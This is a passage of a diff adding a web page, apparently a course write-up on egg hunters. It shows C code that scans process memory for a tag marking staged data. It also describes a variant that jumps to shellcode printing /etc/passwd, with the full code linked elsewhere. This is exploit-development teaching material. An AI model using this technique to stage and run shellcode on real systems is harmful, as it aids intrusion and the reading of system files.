+	unsigned int max_page = (pow(2, 32) / page_size); 
+	unsigned int page_cursor = 0;
+	unsigned int mem_cursor = 0;		
+	_Bool found = 0; 
+	
+	for (unsigned int i = 0; i &lt; max_page; i++) {
+		page_cursor = (i * page_size);
+		///
+
+		if ((access((char *) page_cursor, F_OK) == -1) &amp;&amp; (errno == EFAULT)) {
+			continue;
+		} else {		
+			for (unsigned int n = 0; n &lt; (page_size -3); n++) {
+				mem_cursor = (page_cursor + n);
+				///
+
+				unsigned int *ptr = (unsigned int *) mem_cursor; 
+			
+				if (egg_hunt(ptr, egg, 0)) {								
+					ptr++;
+					///
+
+					if (egg_hunt(ptr, egg, 1)) {
+						ptr++;
+						///						
+
+						return (unsigned int) ptr;						
+					}
+				}
+			}
+		}
+	}
+
+	///
+	return 0;
+}
+</code></pre><h3 id="bonus-2--egg-hunter-principle-applied-to-c-code-execution">Bonus 2 : Egg Hunter Principle applied to C (Code Execution).</h3>
+<p>This time, instead of just retrieving data from memory, when our scanner find the Egg pattern in memory it will redirect execution flow to it address.</p>
+<p>The shellcode used in this program will print content of <code>/etc/passwd</code> file.</p>
+<p>You will find the full code at this address : <a href="https://github.com/DarkCoderSc/slae32-egghunters/blob/master/egg-shellcode-embedded.c">https://github.com/DarkCoderSc/slae32-egghunters/blob/master/egg-shellcode-embedded.c</a></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex justify-between">
+
+
+
+
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "phrozen-1" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
